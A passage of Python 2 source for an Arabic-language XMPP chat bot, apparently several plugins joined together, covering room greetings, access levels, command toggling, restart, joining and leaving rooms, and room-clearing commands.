                return
        file='rooms-data/'+s[1]+'/commoff.py'
        get_commoff(s[1])
        if p:
                if not p in COMMAND1S:
                        reply(type, s, s[2]+' : '+Xcommo[2])
                        return
                if not p in COMMOFF[s[1]]:
                        reply(type, s, s[2]+' : '+Xcommo[4])
                        return
                db=eval(read_file(file))
                if p in db:
                        del db[p]
                write_file(file, str(db))
                reply(type, s, s[2]+' : '+Xcommo[7]+p)
                get_commoff(s[1])
        else:
                reply(type, s, s[2]+' : '+' | '.join(COMMOFF[s[1]].keys()))
def get_commoff(gch):
        global COMMOFF
        COMMOFF[gch]={}
        file='rooms-data/'+gch+'/commoff.py'
        check_file(gch, 'commoff.py')
        db=eval(read_file(file))
        if db:
                COMMOFF[gch]=db


register(handler_commoff, Xcommo[0], 30)
register(handler_common, Xcommo[1], 30)
register_stage1_init(get_commoff)

######################################################
######################################################
#ترحيب الخاص
def atjoin_greetex(groupchat, nick, aff, role, cljid):
        y = 0
        res_1 = ''
        if 1==1:

                DBPATH='rooms-data/'+groupchat+'/Greet.py'
                if check_file(groupchat,'Greet.py'):
                        GREETEX = eval(read_file(DBPATH))
                        if aff in GREETEX.keys():
                                mas = GREETEX[aff]
                                res = random.choice(mas)

                                res_ = string.split(res, ' ', res.count(' '))

                                while y != len(res_):
#					if '%NICK%' == res_[y]:
                                        if res_[y].count('nick')>0:
                                                if res_[y].count(',')>0:
                                                        res_[y] = nick+','
                                                if res_[y].count('.')>0:
                                                        res_[y] = nick+'.'
                                                if res_[y].count('!')>0:
                                                        res_[y] = nick+'!'
                                                if res_[y].count('?')>0:
                                                        res_[y] = nick+'?'
                                                if (res_[y].count(',')==0) & (res_[y].count('.')==0) & (res_[y].count('!')==0) & (res_[y].count('?')==0):
                                                        res_[y] = nick
                                        res_1 = res_1 + res_[y]
                                        res_1 = res_1 + ' '
                                        y = y + 1
					
                                msg(cljid, groupchat+'/'+nick, res_1)

def greetex_work(aff='',greet='',gch=''):
        mas = ['0']
        DBPATH='rooms-data/'+gch+'/Greet.py'
        if check_file(gch,'Greet.py'):
                greetexdb = eval(read_file(DBPATH))
                if aff and greet:
                        if not aff in greetexdb.keys():
                                try:
                                        mas = greetexdb[aff]
                                except:
                                        #msg('', str(len(mas)))
                                        mas[ len(mas)  - 1] = greet
                                mas[ len(mas) - 1 ] = greet
                                greetexdb[aff]=mas
                                write_file(DBPATH, str(greetexdb))
                                return 1
                        else:
                                try:
                                        mas = greetexdb[aff]
                                        mas = mas + [greet]
                                except:
                                        #msg('', str(len(mas)))
                                        mas[0] = greet
                                greetexdb[aff]=mas
                                write_file(DBPATH, str(greetexdb))
                                return 1
                elif aff:
                        if aff in greetexdb.keys():
                                del greetexdb[aff]
                                write_file(DBPATH, str(greetexdb))
                                return 1
                        return 0
                else:
                        return 0

def handler_greetex(type, source, parameters):
        if not parameters:
                reply(type, source, source[2]+' : '+Xgreetex[4]%("owner","admin","member","none"))
                return

        if parameters.count(' ')==0:
#		msg('', u'Отладка: '+affi+u' '+str(answ)+u' '+source[1])
                answ=greetex_work(parameters, gch=source[1])
                if answ:
                        reply(type, source, source[2]+' : '+Xgreetex[10])
                        return
                else:
                        reply(type, source, source[2]+' : '+Xgreetex[5])
                        return

        parameters=parameters.strip()
        rawgreet = string.split(parameters, ' ', 1)
        if not len(rawgreet)==2:
                reply(type, source, source[2]+' : '+Xgreetex[7])
                return
        greet=rawgreet[1].strip()
        affi=rawgreet[0].strip()
        if (affi != 'none') & (affi != 'member') & (affi != 'admin') & (affi != 'owner') & (affi != 'اظهار') & (affi != 'مسح'):
                msg(source[1], Xgreetex[5])
                return

        answ=greetex_work(affi, "nick "+greet, source[1])
	
        if answ:
                reply(type, source, source[2]+' : '+Xgreetex[8]%(affi,"s"))
        else:
                reply(type, source, source[2]+' : '+Xgreetex[9])

        if not greet:
                answ=greetex_work(affi, gch=source[1])
                if answ:
                        reply(type, source, source[2]+' : '+Xgreetex[12])
                        return
                else:
                        reply(type, source, source[2]+' : '+Xgreetex[11])
                        return

register(handler_greetex, Xgreetex[2], 30)
register_join_handler(atjoin_greetex)

######################################################
######################################################
#ترحيب العام
def atjoin_greetex1(groupchat, nick, aff, role, cljid):
        ko = 0
        res_14 = ''
        if 1==1:

                DBPATH1='rooms-data/'+groupchat+'/Greet1.py'
                if check_file(groupchat,'Greet1.py'):
                        GREETEX1 = eval(read_file(DBPATH1))
                        if aff in GREETEX1.keys():
                                msr = GREETEX1[aff]
                                res75 = random.choice(msr)

                                res_t = string.split(res75, ' ', res75.count(' '))

                                while ko != len(res_t):
#					if '%NICK%' == res_t[ko]:
                                        if res_t[ko].count('nick')>0:
                                                if res_t[ko].count(',')>0:
                                                        res_t[ko] = nick+','
                                                if res_t[ko].count('.')>0:
                                                        res_t[ko] = nick+'.'
                                                if res_t[ko].count('!')>0:
                                                        res_t[ko] = nick+'!'
                                                if res_t[ko].count('?')>0:
                                                        res_t[ko] = nick+'?'
                                                if (res_t[ko].count(',')==0) & (res_t[ko].count('.')==0) & (res_t[ko].count('!')==0) & (res_t[ko].count('?')==0):
                                                        res_t[ko] = nick
                                        res_14 = res_14 + res_t[ko]
                                        res_14 = res_14 + ' '
                                        ko = ko + 1
					
                                msg(cljid, groupchat, res_14)

def greetex_work1(aff='',greetx='',gch=''):
        msr = ['0']
        DBPATH1='rooms-data/'+gch+'/Greet1.py'
        if check_file(gch,'Greet1.py'):
                greetexdb1 = eval(read_file(DBPATH1))
                if aff and greetx:
                        if not aff in greetexdb1.keys():
                                try:
                                        msr = greetexdb1[aff]
                                except:
                                        #msg('', str(len(msr)))
                                        msr[ len(msr)  - 1] = greetx
                                msr[ len(msr) - 1 ] = greetx
                                greetexdb1[aff]=msr
                                write_file(DBPATH1, str(greetexdb1))
                                return 1
                        else:
                                try:
                                        msr = greetexdb1[aff]
                                        msr = msr + [greetx]
                                except:
#					msg('', str(len(msr)))
                                        msr[0] = greetx
                                greetexdb1[aff]=msr
                                write_file(DBPATH1, str(greetexdb1))
                                return 1
                elif aff:
                        if aff in greetexdb1.keys():
                                del greetexdb1[aff]
                                write_file(DBPATH1, str(greetexdb1))
                                return 1
                        return 0
                else:
                        return 0

def handler_greetex1(type, source, parameters):
        if not parameters:
                reply(type, source, source[2]+' : '+Xgreetex[3]%("owner","admin","member","none"))
                return

        if parameters.count(' ')==0:
#		msg('', u'Отладка: '+affi+u' '+str(answ)+u' '+source[1])
                answ=greetex_work1(parameters, gch=source[1])
                if answ:
                        reply(type, source, source[2]+' : '+Xgreetex[10])
                        return
                else:
                        reply(type, source, source[2]+' : '+Xgreetex[6])
                        return

        parameters=parameters.strip()
        rawgreet = string.split(parameters, ' ', 1)
        if not len(rawgreet)==2:
                reply(type, source, source[2]+' : '+Xgreetex[7])
                return
        greetx=rawgreet[1].strip()
        affi=rawgreet[0].strip()
        if (affi != 'none') & (affi != 'member') & (affi != 'admin') & (affi != 'owner') & (affi != 'اظهار') & (affi != 'مسح'):
                msg(source[1], Xgreetex[6])
                return

        answ=greetex_work1(affi, "nick "+greetx, source[1])
	
        if answ:
                reply(type, source, source[2]+' : '+Xgreetex[8]%(affi,"s"))
        else:
                reply(type, source, source[2]+' : '+Xgreetex[9])

        if not greetx:
                answ=greetex_work1(affi, gch=source[1])
                if answ:
                        reply(type, source, source[2]+' : '+Xgreetex[12])
                        return
                else:
                        reply(type, source, source[2]+' : '+Xgreetex[11])
                        return

register(handler_greetex1, Xgreetex[1], 30)
######################################################
######################################################

register_join_handler(atjoin_greetex1)
def handler_greet(type,source,parameters):
                reply(type, source, source[2]+' : '+Xgreetex[13])
register(handler_greet, Xgreetex[0], 0)

######################################################
######################################################

# -*- coding: utf-8 -*-


def change_access_temp(gch, source, level=0):
        global ACCBYCONF
        jid = get_true_jid(source)
        try:
                level = int(level)
        except:
                level = 0
        if not ACCBYCONF.has_key(gch):
                ACCBYCONF[gch] = gch
                ACCBYCONF[gch] = {}
        if not ACCBYCONF[gch].has_key(jid):
                ACCBYCONF[gch][jid]=jid
        ACCBYCONF[gch][jid]=level

def change_access_perm(gch, source, level=None):
        global ACCBYCONF
        jid = get_true_jid(source)
        try:
                level = int(level)
        except:
                pass
        temp_access = eval(read_file(ACCBYCONF_FILE))
        if not temp_access.has_key(gch):
                temp_access[gch] = gch
                temp_access[gch] = {}
        if not temp_access[gch].has_key(jid):
                temp_access[gch][jid]=jid
        if level:
                temp_access[gch][jid]=level
        else:
                del temp_access[gch][jid]
        write_file(ACCBYCONF_FILE, str(temp_access))
        if not ACCBYCONF.has_key(gch):
                ACCBYCONF[gch] = gch
                ACCBYCONF[gch] = {}
        if not ACCBYCONF[gch].has_key(jid):
                ACCBYCONF[gch][jid]=jid
        if level:
                ACCBYCONF[gch][jid]=level
        else:
                del ACCBYCONF[gch][jid]
        get_access_levels(source[3])

def change_access_perm_glob(source, level=0):
        global GLOBACCESS
        jid = get_true_jid(source)
        temp_access = eval(read_file(GLOBACCESS_FILE))
        if level:
                temp_access[jid] = level
        else:
                del temp_access[jid]
        write_file(GLOBACCESS_FILE, str(temp_access))
        get_access_levels(source[3])

def change_access_temp_glob(source, level=0):
        global GLOBACCESS
        jid = get_true_jid(source)
        if level:
                GLOBACCESS[jid] = level
        else:
                del GLOBACCESS[jid]


def handler_access_view_access(type, source, parameters):
        accdesc={'0':Xaccess[3],'1':Xaccess[4],'10':Xaccess[5],'11':Xaccess[6],'15':Xaccess[7],'16':Xaccess[8],'20':Xaccess[9],'30':Xaccess[10],'40':Xaccess[11],'100':Xaccess[12]}
        if not parameters:
                level=str(user_level(source[1]+'/'+source[2], source[1]))
                if level in accdesc.keys():
                        levdesc=accdesc[level]
                else:
                        levdesc=''
                reply(type, source, source[2]+' : '+Xaccess[13]+level+u' '+levdesc)
        else:
                if not source[1] in GROUPCHATS:
                        reply(type, source, u'هذا الامر في الغرف')
                        return
                nicks = GROUPCHATS[source[1]].keys()
                if parameters.strip() in nicks:
                        level=str(user_level(source[1]+'/'+parameters.strip(),source[1]))
                        if level in accdesc.keys():
                                levdesc=accdesc[level]
                        else:
                                levdesc=''
                        reply(type, source, level+' '+levdesc)
                else:
                        reply(type, source, source[2]+' : '+Xaccess[14])

register(handler_access_view_access, Xaccess[0], 0)
#الاكسز
######################################################
######################################################
#اعطاء اكسز
def handler_bot_owner(type, source, parameters):    
        if not parameters:
                        reply(type, source, source[2]+' : '+XbOtOwner[1])
                        return		
        if parameters:
                global GLOBACCESS                    
                slaefr = parameters.strip().split()
                if len(slaefr)<1:
                        reply(type, source, u'Wrong Arguments!')
                        return
                if len(slaefr) > 2:
                        reply(type, source, source[2]+' : '+XbOtOwner[2])
                        return
                jid=get_true_jid(source[1]+'/'+source[2])
                if parameters.count(XbOtOwner[11]) and slaefr[1] in GLOBACCESS:
                        reply(type, source, slaefr[1]+XbOtOwner[3])
                        return
                if parameters.count(XbOtOwner[11]) and parameters.count('@') and parameters.count('.'):
                        roster_add(slaefr[1], source[3])
                        reply(type, source, source[2]+' : '+XbOtOwner[4])						
                        change_access_perm_glob(slaefr[1], 100)
                        return
                if parameters.count(XbOtOwner[12]) and not slaefr[1] in GLOBACCESS:
                        reply(type, source, source[2]+' : '+XbOtOwner[5])
                        return
                if parameters.count(XbOtOwner[12]) and slaefr[1] in GLOBACCESS:
                        reply(type, source, source[2]+' : '+XbOtOwner[6])	
                        roster_del(slaefr[1], source[3])						
                        change_access_perm_glob(slaefr[1], 0)
                        return
                if parameters.count(XbOtOwner[13]) and not parameters.count('@'):
                        GLOBACCESS = eval(read_file(GLOBACCESS_FILE))
                        for jid in ADMINS:
                                GLOBACCESS[jid] = 100
                                write_file(GLOBACCESS_FILE, str("{'"+XbOtOwner[10]+"': 100}"))
                                reply(type, source, source[2]+' : '+XbOtOwner[7]+str(len(GLOBACCESS.keys()))+' action\'s.')
                                return
                if parameters.count(XbOtOwner[14]) and not parameters.count('@'):
                        res1 = XbOtOwner[8]
                        res1_ = u''
                        i = 0
                        if len(GLOBACCESS) == 1:
                                reply(type, source, source[2]+' : '+XbOtOwner[9])
                                return
                        GLOBACCESS = eval(read_file(GLOBACCESS_FILE))
                        for jid in GLOBACCESS:
                                if GLOBACCESS[jid] >=8:
                                        i += 1
                                        if GLOBACCESS[jid] == 100:
                                                inf = ''
                                        res1_+= ' | '+jid+inf
                        if res1_ == '':
                                res1_ = u'Empty'
                        res1 += res1_
                        reply(type,source,res1)
                else:						
                        reply(type, source, source[2]+' : '+XbOtOwner[1])	
                                                                     
def get_access_levels(cljid):
        global GLOBACCESS
        global ACCBYCONFFILE
        for jid in ADMINS:
                GLOBACCESS[jid] = 100
                write_file(GLOBACCESS_FILE, str(GLOBACCESS))

register(handler_bot_owner, XbOtOwner[0], 100)
register_stage0_init(get_access_levels)

######################################################
######################################################
#ريستارت تلقائي
def check_jids_connect(*an):
    try:
        if "no" not in AuTo_ResTarT:
            time.sleep(TimeResTart)
            p = domish.Element(('jabber:client', 'presence'))
            p['type'] = 'unavailable'
            p.addElement('status').addContent(u'BoT AuTo ResTarT')
            for x in CLIENTS.keys():
                reactor.callFromThread(dd, p, CLIENTS[x])
            reactor.stop()
            time.sleep(2)
            os.execl(sys.executable, sys.executable, sys.argv[0])
    except: pass
register_stage0_init(check_jids_connect)

#########
# -*- coding: utf-8 -*-

TRAF_FROM_MUC = {}

bot_start = str(datetime.datetime.today())[:-7]

def turn_byte(b):
    if b<1024:
        return str(b)+u'b'
    if b>=1024:
        b=b/1024
        if b<1024:
            return str(b)+u'ذڑb'
        return str(b/1024)+u'ذœb'

		
#rss#####
uu_RES={}

tymo={"test":1}

from threading import Timer

class RepeatedTimer(object):
    def __init__(self, interval, function,cljid,neno1,room):	  
        self._timer     = None
        self.interval   = interval
        self.function   = function
        self.cljid      = cljid
        self.neno      = neno1	
        self.room      = room			
        self.is_running = False
        self.tymoo=None
        self.start()		
    def _run(self):
        self.is_running = False
        try:		
         ytrx44= uu_RES[self.room][self.neno].keys() 
         jjjj =''.join(str(unicode(ytrx44)))
         jj34=jjjj.replace("[","").replace("]","")			 
         self.tymoo= int(jj34)	
        except: pass		 
        self.start()
        if self.room in uu_RES:
         if self.neno in uu_RES[self.room ]:			 
          self.function(self.neno,self.cljid,self.room)			 

        
    def start(self):
        if not self.is_running:
            self._timer = Timer(self.interval, self._run)		
            self._timer.start()
            self.is_running = False

######################################################
######################################################
#مجموعة اوامر الاونر
def hnd_restart(type, source, parameters):
    if parameters:
        if parameters.lower() in [u'timer',u'yyyyy']:
            #reply(type, source, u'ممممم')
            p = domish.Element(('jabber:client', 'presence'))
            #p['type'] = 'unavailable'
            p.addElement('show').addContent('dnd')
            p.addElement('status').addContent(u'ممممم')
            for x in CLIENTS.keys():
                reactor.callFromThread(dd, p, CLIENTS[x])
            time.sleep(180)
            hnd_restart(type, source, str())
            return
        if parameters.lower() in [u'icq',u'ممممم']:
            if 'icq_restart' in globals().keys() and UIN and ENABLE_ICQ=='1' and ICQ_PASS:
                icq_restart()
                #reply(type, source, u'UIN'+UIN)
                return
            else:
                #reply(type, source, u'مممممم ICQ')
                return
        list = [x for x in range(10) if GENERAL_CONFIG("Bot_jid"+str(x)).count(parameters.lower())]
        if not list:
            if GENERAL_CONFIG("Bot_jid").count(parameters.lower()):
                a, b = GENERAL_CONFIG("Bot_jid"), GENERAL_CONFIG("Bot_pass")
                #reply(type, source, u'ممممممم:\n'+a)
                reactor.callFromThread(MelodX, b, a)
                return
            #reply(type, source, u'ممممم '+parameters.lower()+u'ممممم')
            return
        if len(list)>1:
            #reply(type, source, u'مممممممم!')
            return
        istr = str(list[0])
        a, b = GENERAL_CONFIG("Bot_jid"+istr), GENERAL_CONFIG("Bot_pass"+istr)
        if not b:
            #reply(type, source, u'ممممم')
            return
        #reply(type, source, u'مممممممممم:'+a)
        reactor.callFromThread(MelodX, b, a)
        return
    reply(type, source, source[2]+' : '+Xowner[28])
    p = domish.Element(('jabber:client', 'presence'))
    p['type'] = 'unavailable'
    p.addElement('status').addContent(Xowner[29])
    for x in CLIENTS.keys():
        reactor.callFromThread(dd, p, CLIENTS[x])
    reactor.stop()
    time.sleep(2)
    os.execl(sys.executable, sys.executable, sys.argv[0])

def hnd_off(type, source, parameters):
    reply(type, source, source[2]+' : '+Xowner[26])
    p = domish.Element(('jabber:client', 'presence'))
    p['type'] = 'unavailable'
    p.addElement('status').addContent(Xowner[27])
    for x in CLIENTS.keys():
        reactor.callFromThread(dd, p, CLIENTS[x])
    reactor.stop()
    os._exit(1)

def hnd_wherei(type, source, parameters):
    rep=''
    n=0
    inmuc = 0
    list=[]
    txt=eval(read_file('rooms-data/chatroom.py'))
    for x in txt.keys():
        if x.count('@con') or not x in CLIENTS.keys():
            continue
        ii = txt.keys().index(x)+1
        rep+=Xowner[21]+x+'/STRONG_BOT'+'\n\nقائمة روماتي هي : \n'
        for c in txt[x].keys():
            if c in GROUPCHATS.keys():
                inmuc = len([x for x in GROUPCHATS[c].keys() if GROUPCHATS[c][x]['ishere']])
                if not inmuc:
                    list.append(c)
                rep+=c+' ('+str(inmuc)+')\n'
    if list:
        rep+=Xowner[22]+', '.join(list)+Xowner[23]
    if parameters.count(u'') and not parameters.count(u'  '):
       reply('chat', source, Xowner[24]+Xowner[25]+str(len(GROUPCHATS))+'  روم  '+rep)
    if parameters.count(u'  '):
       reply(type, source, u' :\n'+str(len(GROUPCHATS)))
	

def hnd_proper(t, s, p):
    import shutil
    n, rem = 0, []
    list = [x for x in GROUPCHATS.keys() if len(GROUPCHATS[x])==0]
    if list:
        txt = eval(read_file('rooms-data/chatroom.py'))
        for x in list:
            if not x or x.isspace():
                continue

            try: del GROUPCHATS[x]
            except: pass

            try:
                if os.path.isdir(os.path.join('rooms-data',x)) and os.path.exists(os.path.join('rooms-data',x)):
                    shutil.rmtree(os.path.join('rooms-data',x))
                    n+=1
                    rem.append(x)
                    if "JOIN_TIMER" in globals().keys():
                        if x in JOIN_TIMER.keys():
                            del JOIN_TIMER[x]
            except: pass
            hnd_proper_cfg(list)
        reply(t, s, s[2]+' : '+Xowner[19]+str(n)+'):\n'+', '.join(rem))
    else: reply(t, s, s[2]+' : '+Xowner[20])

def hnd_proper_cfg(list):
    if list:
        file = 'rooms-data/chatroom.py'
        db = eval(read_file(file))
        for x in db.keys():
            try:
                for c in db[x].keys():
                    if c in list:
                        del db[x][c]
            except: continue
        write_file(file, str(db))
        

def hnd_join(t, s, p):
    if not p:
        reply(t, s, s[2]+' : '+Xowner[7])
        return
        if p.count('@con') or p.count('@chat'):
                ss = p.split()
                try:
                        nick = re.findall('nick\s{0,2}=\s{0,2}(.*?)([ ,]|$)',p)[0][0]
                        if not nick or len(nick)<2 or nick.isspace():
                                nick = DEFAULT_NICK
                except: pass
                p = ss[0]
    if not p.count('.'):
        p = p+Xowner[11]
    #unicodedata.category
    packet = IQ(CLIENTS[s[3]], 'get')
    packet.addElement('query', 'jabber:iq:version')
    packet.addCallback(hnd_join_result, t, s, p)
    reactor.callFromThread(packet.send, p)

def hnd_join_result(type, source, parameters, x):
    global DEFSTAT
    file = 'rooms-data/chatroom.py'
    level = int(user_level(source[1]+'/'+source[2], source[1]))
    if x['type'] == 'error':
        try: code = [c['code'] for c in x.children if (c.name=='error')]
        except: code = []
        if code:
            if code[0] in ['404']:
                reply(type, source, source[2]+' : '+Xowner[8])
                return
            if code[0] in ['403']:
                reply(type, source, source[2]+' : '+Xowner[9])
                return
    jid=get_true_jid(source[1]+'/'+source[2])
    parameters=parameters.lower()
    try: os.path.exists(parameters)
    except:
        reply(type, source, source[2]+' : '+Xowner[10])
        return
    db=eval(read_file(file))
    if not source[3] in db:
        db[source[3]]={}
    for x in db.keys():
        for c in db[x].keys():
            if x!= source[3] and c == parameters:
                if level<40 and x in CLIENTS.keys():
                    #reply(type, source, u'ممممم:\n'+parameters)
                    return
                else:
                    reply(type, source, u'يرجى الانتباه انا متواجد هناك بالحساب التالي:\n('+x+')\n تم سحبي من الحساب الاول والدخول بالحساب الثاني :\n('+source[3]+')'+" ")
                    hnd_leave(type, source, parameters)
                    try:
                        for x in db.keys():
                            for c in db[x].keys():
                                if c==parameters:
                                    del db[x][c]
                                    if c in GROUPCHATS.keys():
                                        del GROUPCHATS[c]
                    except Exception as err:
                        try: print err.message,'error join'
                        except: pass
                    #time.sleep(2)
    frm = source[1]+'/'+source[2]
    db[source[3]][parameters]={'from':frm}
    write_file(file, str(db))
    callback=source[1]+'/'+source[2]
    if type in ['groupchat','public'] and source[1] in GROUPCHATS:
        callback=source[1]
    JOIN_CALLBACK[parameters]=callback
    join(parameters, DEFAULT_NICK, source[3])

def hnd_leave(type, source, parameters):
    if parameters and parameters[:1]=='#' and not parameters.count('@con'):
        if not hasattr(IRC, 'left'):
            reply(type, source, u'IRC .......·!')
            return
        IRC.left(parameters.encode('utf-8'))
        file = 'rooms-data/channel.py'
        db = eval(read_file(file))
        if parameters in db.keys():
            del db[parameters]
            write_file(file, str(db))
        reply(type, source, u'. '+parameters)
        return
    if not parameters and not source[1] in GROUPCHATS:
        return
    level = int(user_level(source[1]+'/'+source[2], source[1]))
    file = 'rooms-data/chatroom.py'
    if not parameters:
        db=eval(read_file(file))
        if source[3] in db and source[1] in db[source[3]]:
            del db[source[3]][source[1]]
            write_file(file, str(db))
        if source[1] in GROUPCHATS:
            del GROUPCHATS[source[1]]
        leave(source[1],Xowner[12]+source[2], source[3])
        try: log_write(Xowner[12]+source[2], '', 'public', source[1])
        except: pass
    else:
        parameters = parameters.lower()
        if level<40:
            reply(type, source, source[2]+' : '+Xowner[13])
            return
        if not parameters.count('@con'):
            parameters = parameters+'@c'
        db = eval(read_file(file))
        
        botjid = [x for x in db.keys() if hasattr(db[x], 'keys') and parameters in db[x].keys()]

        rep = ''

        if "JOIN_TIMER" in globals().keys() and parameters in JOIN_TIMER.keys():
                del JOIN_TIMER[parameters]
                rep+= u' '
        if parameters in GROUPCHATS.keys():
            del GROUPCHATS[parameters]
            rep+= u' '
        if botjid:
            botjid = botjid[0]
            if parameters in db[botjid].keys():
                del db[botjid][parameters]
                write_file(file, str(db))
                rep+= u' '
        else:
            if not rep or rep.isspace():
                reply(type, source, source[2]+' : '+Xowner[14])
                return
            else:
                reply(type, source, rep)
                return
        leave(parameters, '', botjid)
        try: log_write(u''+source[2], '', 'public', parameters)
        except: pass
        if source[1] in GROUPCHATS.keys():
            reply(type, source, source[2]+' : '+Xowner[15]+parameters+'> ( '+botjid+')\n'+rep)
    
    def popen_read(cmd):
        pr = os.popen(cmd)
        data = pr.read()
        pr.close()
        return data
    
        if os.name=='posix':
                try:
                #pr = os.popen('ps -o rss -p %s' % os.getpid())
                 ls = popen_read('ps -o rss -p %s' % os.getpid()).splitlines()#pr.readlines()
                 if len(ls) >= 2:
                        mem = ls[1].strip()
                #pr.close()
                except: pass
        if mem: rep += u'' % (round(int(mem),1) / 1024)
        try:
            ls = popen_read('ps -p '+str(os.getpid())+' -o %cpu' ).splitlines()
            if len(ls) >= 2:
                cpu = ls[1].strip()
        except: pass
        if cpu: rep += u'- ..\n'

    rep+=u''+str(INFMELODY['imsg']+INFMELODY['jmsg'])+':\n'
    rep+=u'   '+(str(INFMELODY['imsg']) if hasattr(ICQ, 'sendMessage') else u'')+'\n'
    rep+=u'  '+str(INFMELODY['jmsg'])+'\n'
    rep+=u''+str(INFMELODY['tin']/1024)+u' '+str(INFMELODY['tout']/1024)+u''
    rep+=u''+str(INFMELODY['out'])+'\n'
    rep+=u''+str(INFMELODY['auth'])+'\n'
    reply(type, source, source[2]+' : '+Xowner[16])

def hnd_globmsg(type, source, parameters):
    file = 'rooms-data/chatroom.py'
    db = eval(read_file(file))
    if not GROUPCHATS or not parameters:
        return
    if not db:
        return
    for x in db.keys():
        for c in db[x].keys():
            if c in GROUPCHATS:
                msg(x, c, Xowner[17]+parameters)
    reply(type, source, source[2]+' : '+Xowner[18]+str(len(GROUPCHATS)))


clearstartnew = 1
def hnd_clear(type, source, parameters):  
 global clearstartnew 
 if "status" in Config_Clear:
    if not source[1] in GROUPCHATS:
        return
    clearstartnew+=1
    p = domish.Element(('jabber:client', 'presence'))
    p['to'] = u'%s/%s' % (source[1], DEFAULT_NICK)
    try:
                p.addElement('status').addContent("جاري تنظيف الروم")
                p.addElement('show').addContent('dnd')
    except: pass		
    reactor.callFromThread(dd, p, CLIENTS[source[3]])		       
    for x in range(1, 21):            
        time.sleep(1.30)
        msg(source[3], source[1], '' or parameters)
    time.sleep(2)
    p = domish.Element(('jabber:client', 'presence'))
    p['to'] = u'%s/%s' % (source[1], DEFAULT_NICK)
    try:
                p.addElement('status').addContent(statusz)
                p.addElement('show').addContent('chat')
    except: pass		
    reactor.callFromThread(dd, p, CLIENTS[source[3]])
    clearstartnew=1
	
 elif "room" in Config_Clear and clearstartnew ==1:
    if not source[1] in GROUPCHATS:
        return	
    clearstartnew+=1
    
    p = domish.Element(('jabber:client', 'presence'))
    p['to'] = u'%s/%s' % (source[1], DEFAULT_NICK)
    try:
                p.addElement('status').addContent("يتم الآن تنظيف الروم من الكلام")
                p.addElement('show').addContent('dnd')
    except: pass		
    reactor.callFromThread(dd, p, CLIENTS[source[3]])				
    if not parameters:
     rang=0
     msgx=""  
     reply('groupchat', source, source[2]+' : '+Xclear[3])        
     for x in range(0, rang):            
        time.sleep(4.30)
        msg(source[3], source[1], msgx)
     reply('groupchat', source, source[2]+' : '+Xclear[4])	
     clearstartnew=1	 
    else:
     sp=parameters.split() 
     try: 
      if parameters	in CENSORX:
       msgx="***"		   
      elif nawrsx1(parameters, source[1]):	
       msgx="***"		  
      elif nawrs1(parameters, source[1]):		
       msgx="***"	
      else:	   
       msgx=sp[0]	  
     except: msgx="" 
     try: 
      if int(sp[1]) >= 20:rang=1
      else:	rang= int(sp[1]) 
     except: rang=0
     reply('groupchat', source, source[2]+' : '+Xclear[3])        
     for x in range(0, rang):            
        time.sleep(1.30)
        msg(source[3], source[1], msgx)
     reply('groupchat', source, source[2]+' : '+Xclear[4])	
     clearstartnew=1
    p = domish.Element(('jabber:client', 'presence'))
    p['to'] = u'%s/%s' % (source[1], DEFAULT_NICK)
    try:
                p.addElement('status').addContent(statusz)
                p.addElement('show').addContent('chat')
    except: pass		
    reactor.callFromThread(dd, p, CLIENTS[source[3]])	
 else:
  if clearstartnew ==1:
    if not source[1] in GROUPCHATS:
        return	
    clearstartnew+=1
    if not parameters:
     rang=0
     msgx=""  
     reply('groupchat', source, source[2]+' : '+Xclear[3])        
     for x in range(0, rang):            
        time.sleep(1.30)
        msg(source[3], source[1], msgx)
     reply('groupchat', source, source[2]+' : '+Xclear[4])	
     clearstartnew=1	 
    else:
     sp=parameters.split() 
     try: 
      if parameters	in CENSORX:
       msgx="***"		   
      elif nawrsx1(parameters, source[1]):	
       msgx="***"		  
      elif nawrs1(parameters, source[1]):		
       msgx="***"	
      else:	   
       msgx=sp[0]	  
     except: msgx="" 
     try: 
      if int(sp[1]) >= 20:rang=1
      else:	rang= int(sp[1]) 	 
     except: rang=0
     reply('groupchat', source, source[2]+' : '+Xclear[3])        
     for x in range(0, rang):            
        time.sleep(1.30)
        msg(source[3], source[1], msgx)
     reply('groupchat', source, source[2]+' : '+Xclear[4])	
     clearstartnew=1

register(hnd_proper, Xowner[4], 100)
register(hnd_globmsg, Xowner[5], 100)
register(hnd_restart, Xowner[3], 100)
register(hnd_wherei, Xowner[2], 100)
register(hnd_off, Xowner[6], 100)
register(hnd_join, Xowner[0], 100)
register(hnd_leave, Xowner[1], 100)
register(hnd_clear, Xclear[0], 20)
register(hnd_clear, Xclear[1], 20)
register(hnd_clear, Xclear[2], 20)
######################################################
######################################################
# -*- coding: utf-8 -*-
#الكابس
def CAPS(type, source, parameters):
        if parameters:
                if GROUPCHATS.has_key(source[1]) and GROUPCHATS[source[1]].has_key(parameters):
                        caps=GROUPCHATS[source[1]][parameters]['caps']
                        caps2=GROUPCHATS[source[1]][source[2]]['caps2']                         
                        if caps:
                                reply(type, source, source[2]+' : '+XCaps[1]%(caps,caps2)) 
                        else:
                                reply(type, source, source[2]+' : '+XCaps[2])
                else:
                        reply(type, source, source[2]+' : '+XCaps[3])
        else:
                if GROUPCHATS.has_key(source[1]) and GROUPCHATS[source[1]].has_key(source[2]):
                        caps=GROUPCHATS[source[1]][source[2]]['caps']
                        caps2=GROUPCHATS[source[1]][source[2]]['caps2']                        
                        if caps:
                                reply(type, source, source[2]+' : '+XCaps[1]%(caps,caps2)) 
                        else:
                                reply(type, source, source[2]+' : '+XCaps[2])

def CAPS2(prs, cljid):
  try:
    jid = prs['from'].split('/')
    groupchat = jid[0]
    nick = prs['from'][len(groupchat)+1:]
    try: caps1 = [i for i in prs.children if i.name=='c'][0]
    except: caps1 = ""	
    try: caps = caps1['node']
    except: caps  = "No Caps"
    try: caps2 = caps1['ext']
    except: caps2  = "No Ext"	    
    if groupchat in GROUPCHATS and nick in GROUPCHATS[groupchat]:
                GROUPCHATS[groupchat][nick]['caps']=caps
                GROUPCHATS[groupchat][nick]['caps2']=caps2                
  except: pass	                
register_presence_handler(CAPS2)
register(CAPS, XCaps[0], 20)

def CAPS3(type, source, parameters):
 if type == 'chat':	
        if parameters:
                if GROUPCHATS.has_key(source[1]) and GROUPCHATS[source[1]].has_key(parameters):
                        caps3=GROUPCHATS[source[1]][parameters]['caps3']                    
                        if caps3:
                                reply(type,source, "error: "+unicode(caps3.toXml()))
                        else:
                                reply(type,source, "no ")
                else:
                        reply(type,source, "ليس هنا")
        else:
                if GROUPCHATS.has_key(source[1]) and GROUPCHATS[source[1]].has_key(source[2]):
                        caps3=GROUPCHATS[source[1]][source[2]]['caps3']                    
                        if caps3:
                                reply(type,source, "error: "+unicode(caps3.toXml()))
                        else:
